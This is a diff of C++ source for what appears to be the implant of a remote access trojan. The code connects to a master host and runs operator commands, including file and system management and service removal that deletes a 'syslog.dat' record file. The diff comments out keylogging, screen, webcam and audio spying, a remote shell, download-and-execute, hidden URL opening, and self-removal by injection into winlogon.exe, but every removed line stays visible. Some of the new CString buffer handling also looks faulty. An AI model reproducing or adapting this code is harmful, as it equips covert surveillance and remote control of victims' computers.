@@ -1,29 +1,30 @@
 // KernelManager.cpp: implementation of the CKernelManager class.
-//
-//////////////////////////////////////////////////////////////////////
 
 #include "stdafx.h"
 #include "KernelManager.h"
 #include "loop.h"
 #include "until.h"
-#include "inject.h"
-//////////////////////////////////////////////////////////////////////
+
 // Construction/Destruction
 //////////////////////////////////////////////////////////////////////
 
-char	CKernelManager::m_strMasterHost[256] = {0};
+CString	CKernelManager::m_strMasterHost = _T("");
 UINT	CKernelManager::m_nMasterPort = 80;
 CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, DWORD dwServiceType, LPCTSTR lpszKillEvent, 
 	LPCTSTR lpszMasterHost, UINT nMasterPort) : CManager(pClient)
 {
+
 	if (lpszServiceName != NULL)
 	{
-		lstrcpy(m_strServiceName, lpszServiceName);
+		//lstrcpy(m_strServiceName, lpszServiceName);
+		m_strServiceName = lpszServiceName;
 	}
 	if (lpszKillEvent != NULL)
-		lstrcpy(m_strKillEvent, lpszKillEvent);
+		m_strKillEvent = lpszKillEvent;
+		//lstrcpy(m_strKillEvent, lpszKillEvent);
 	if (lpszMasterHost != NULL)
-		lstrcpy(m_strMasterHost, lpszMasterHost);
+		m_strMasterHost = lpszMasterHost;
+ 		//lstrcpy(m_strMasterHost, lpszMasterHost);
 
 	m_nMasterPort = nMasterPort;
 	m_dwServiceType = dwServiceType;
@@ -32,8 +33,8 @@ CKernelManager::CKernelManager(CClientSocket *pClient, LPCTSTR lpszServiceName, 
 	m_bIsActived = false;
 	// 创建一个监视键盘记录的线程
 	// 键盘HOOK跟UNHOOK必须在同一个线程中
-	m_hThread[m_nThreadCount++] = 
-		MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)Loop_HookKeyboard, NULL, 0,	NULL, true);
+// 	m_hThread[m_nThreadCount++] = 
+// 		MyCreateThread(NULL, 0,	(LPTHREAD_START_ROUTINE)Loop_HookKeyboard, NULL, 0,	NULL, true);
 
 }
 
@@ -57,42 +58,59 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_FileManager, 
 			(LPVOID)m_pClient->m_Socket, 0, NULL, false);
 		break;
-	case COMMAND_SCREEN_SPY: // 屏幕查看
-		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
-			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
-		break;
-	case COMMAND_WEBCAM: // 摄像头
-		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager,
-			(LPVOID)m_pClient->m_Socket, 0, NULL);
-		break;
-	case COMMAND_AUDIO: // 摄像头
-		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
-			(LPVOID)m_pClient->m_Socket, 0, NULL);
-		break;
-	case COMMAND_SHELL: // 远程sehll
-		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
-			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
-		break;
-	case COMMAND_KEYBOARD: 
-		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
-			(LPVOID)m_pClient->m_Socket, 0, NULL);
-		break;
+// 	case COMMAND_SCREEN_SPY: // 屏幕查看
+// 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ScreenManager,
+// 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
+// 		break;
+// 	case COMMAND_WEBCAM: // 摄像头
+// 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_VideoManager,
+// 			(LPVOID)m_pClient->m_Socket, 0, NULL);
+// 		break;
+// 	case COMMAND_AUDIO: // 摄像头
+// 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_AudioManager,
+// 			(LPVOID)m_pClient->m_Socket, 0, NULL);
+// 		break;
+
+
+
+
+
+
+
+
+// 	case COMMAND_SHELL: // 远程sehll
+// 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_ShellManager, 
+// 			(LPVOID)m_pClient->m_Socket, 0, NULL, true);
+// 		break;
+
+
+
+
+
+
+
+
+
+// 	case COMMAND_KEYBOARD: 
+// 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_KeyboardManager,
+// 			(LPVOID)m_pClient->m_Socket, 0, NULL);
+// 		break;
 	case COMMAND_SYSTEM: 
 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_SystemManager,
 			(LPVOID)m_pClient->m_Socket, 0, NULL);
 		break;
 
-	case COMMAND_DOWN_EXEC: // 下载者
-		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
-			(LPVOID)(lpBuffer + 1), 0, NULL, true);
-		Sleep(100); // 传递参数用
-		break;
-	case COMMAND_OPEN_URL_SHOW: // 显示打开网页
-		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
-		break;
-	case COMMAND_OPEN_URL_HIDE: // 隐藏打开网页
-		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
-		break;
+// 	case COMMAND_DOWN_EXEC: // 下载者
+// 		m_hThread[m_nThreadCount++] = MyCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Loop_DownManager,
+// 			(LPVOID)(lpBuffer + 1), 0, NULL, true);
+// 		Sleep(100); // 传递参数用
+// 		break;
+// 	case COMMAND_OPEN_URL_SHOW: // 显示打开网页
+// 		OpenURL((LPCTSTR)(lpBuffer + 1), SW_SHOWNORMAL);
+// 		break;
+// 	case COMMAND_OPEN_URL_HIDE: // 隐藏打开网页
+// 		OpenURL((LPCTSTR)(lpBuffer + 1), SW_HIDE);
+// 		break;
 	case COMMAND_REMOVE: // 卸载,
 		UnInstallService();
 		break;
@@ -105,10 +123,10 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 	case COMMAND_RENAME_REMARK: // 改备注
 		SetHostID(m_strServiceName, (LPCTSTR)(lpBuffer + 1));
 		break;
-	case COMMAND_UPDATE_SERVER: // 更新服务端
-		if (UpdateServer((char *)lpBuffer + 1))
-			UnInstallService();
-		break;
+// 	case COMMAND_UPDATE_SERVER: // 更新服务端
+// 		if (UpdateServer((char *)lpBuffer + 1))
+// 			UnInstallService();
+// 		break;
 	case COMMAND_REPLAY_HEARTBEAT: // 回复心跳包
 		break;
 	}	
@@ -116,34 +134,41 @@ void CKernelManager::OnReceive(LPBYTE lpBuffer, UINT nSize)
 
 void CKernelManager::UnInstallService()
 {
-	char	strServiceDll[MAX_PATH];
-	char	strRandomFile[MAX_PATH];
+	//char	strServiceDll[MAX_PATH];
+	//char	strRandomFile[MAX_PATH];
+	CString strServiceDll;
+	CString strRandomFile;
 
-	GetSystemDirectory(strServiceDll, sizeof(strServiceDll));
-	lstrcat(strServiceDll, "\\");
-	lstrcat(strServiceDll, m_strServiceName);
-	lstrcat(strServiceDll, "ex.dll");
+	GetSystemDirectory(strServiceDll.GetBuffer(), MAX_PATH);
+	strServiceDll += "\\";
+	strServiceDll += m_strServiceName;
+	strServiceDll += "ex.dll";
+// 	lstrcat(strServiceDll, "\\");
+// 	lstrcat(strServiceDll, m_strServiceName);
+// 	lstrcat(strServiceDll, "ex.dll");
 
 	// 装文件随机改名，重启时删除
-	wsprintf(strRandomFile, "%d.bak", GetTickCount());
+	wsprintf(strRandomFile.GetBuffer(), _T("%d.bak"), GetTickCount());
 	MoveFile(strServiceDll, strRandomFile);
 	MoveFileEx(strRandomFile, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);
 
 	// 删除离线记录文件
 
-	char	strRecordFile[MAX_PATH];
-	GetSystemDirectory(strRecordFile, sizeof(strRecordFile));
-	lstrcat(strRecordFile, "\\syslog.dat");
+	//char	strRecordFile[MAX_PATH];
+	CString strRecordFile;
+	GetSystemDirectory(strRecordFile.GetBuffer(), MAX_PATH);
+	//lstrcat(strRecordFile, "\\syslog.dat");
+	strRecordFile += _T("\\syslog.dat");
 	DeleteFile(strRecordFile);
 
-	if (m_dwServiceType != 0x120)  // owner的远程删除，不能自己停止自己删除,远程线程删除
-	{
-		InjectRemoveService("winlogon.exe", m_strServiceName);
-	}
-	else // shared进程的服务,可以删除自己
-	{
-		RemoveService(m_strServiceName);
-	}
+// 	if (m_dwServiceType != 0x120)  // owner的远程删除，不能自己停止自己删除,远程线程删除
+// 	{
+// 		InjectRemoveService("winlogon.exe", m_strServiceName);
+// 	}
+// 	else // shared进程的服务,可以删除自己
+// 	{
+// 		RemoveService(m_strServiceName);
+// 	}
 	// 所有操作完成后，通知主线程可以退出
 	CreateEvent(NULL, true, false, m_strKillEvent);
 }
